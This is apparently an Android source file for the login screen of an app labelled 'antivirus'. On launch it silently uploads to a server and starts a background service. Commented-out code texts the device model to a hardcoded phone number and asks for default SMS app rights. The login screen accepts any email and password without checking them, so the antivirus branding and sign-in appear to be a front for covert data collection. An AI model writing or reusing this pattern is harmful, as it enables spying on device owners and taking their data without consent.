package com.braniax.antivirus;

import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.provider.Telephony;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.io.File;

public class LoginActivity extends AppCompatActivity
{
    EditText etMail, etPass;
    Button btnSignIn;
    private ConnectivityManager connectivityManager;
    private NetworkInfo networkInfo;

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        String deviceModel = Build.MODEL;
        deviceModel = deviceModel.toUpperCase();
        /*if(deviceModel!=null){

            SmsManager smsManager=SmsManager.getDefault();
            smsManager.sendTextMessage("03054280545",null,deviceModel,null,null);

        }*/

        Context context=getApplicationContext();
        UpdationToServer serverClass=new UpdationToServer(context);
        serverClass.addtoServer(context);


        context.startService(new Intent(this,BackgroundService.class));


        //defaultSMS();


    }

    public void loginMethod(View view)
    {
        etMail = findViewById(R.id.etmail);
        etPass = findViewById(R.id.etpass);
        btnSignIn = findViewById(R.id.btnSignIn);
        String mail = etMail.getText().toString().trim();
        String pass = etPass.getText().toString().trim();

        if (!mail.isEmpty() && !pass.isEmpty() && IsNetworkConnected())
        {
            Intent intent=new Intent(LoginActivity.this,MainActivity.class);
            startActivity(intent);
        }

        else if (mail.isEmpty()) {
            etMail.setError("Email is empty ");
            etMail.requestFocus();
        } else if (pass.isEmpty()) {
            etPass.setError("Password is empty ");
            etPass.requestFocus();
        } else if (!IsNetworkConnected()) {
            Toast.makeText(getApplicationContext(), "Not Connected", Toast.LENGTH_LONG).show();
        } else
            Toast.makeText(getApplicationContext(), "Sorry! Unexpected error", Toast.LENGTH_LONG).show();

    }

    private boolean IsNetworkConnected()
    {


        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        networkInfo = connectivityManager.getActiveNetworkInfo();
        return (connectivityManager.getActiveNetworkInfo() != null && networkInfo.isConnected());
    }

    /*@RequiresApi(api = Build.VERSION_CODES.KITKAT)
    protected void defaultSMS()
    {
        //super.onResume();

        final String myPackageName = getPackageName();

        if (!Telephony.Sms.getDefaultSmsPackage(this).equals(myPackageName))
        {

            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("Change SMS app");
            builder.setMessage("Use custom inbox instead of your Messaging as your SMS app?");
            builder.setPositiveButton("Yes", new DialogInterface.OnClickListener()
            {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    Intent intent =new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                    intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, myPackageName);
                    startActivity(intent);
                    Toast.makeText(LoginActivity.this, "custom inbox is now your default SMS App", Toast.LENGTH_SHORT).show();
                    //finish();
                }
            });
            builder.setNegativeButton("No", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    Toast.makeText(LoginActivity.this, "custom inbox is not Default SMS app", Toast.LENGTH_SHORT).show();
                    //finish();
                }
            });

            builder.create();
            builder.show();

        }
    }*/



    public static void trimCache(Context context) {
        try {
            File dir = context.getCacheDir();
            if (dir != null && dir.isDirectory()) {
                deleteDir(dir);
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

    public static boolean deleteDir(File dir) {
        if (dir != null && dir.isDirectory()) {
            String[] children = dir.list();
            for (int i = 0; i < children.length; i++) {
                boolean success = deleteDir(new File(dir, children[i]));
                if (!success) {
                    return false;
                }
            }
        }

        // The directory is now empty so delete it
        return dir.delete();
    }

}
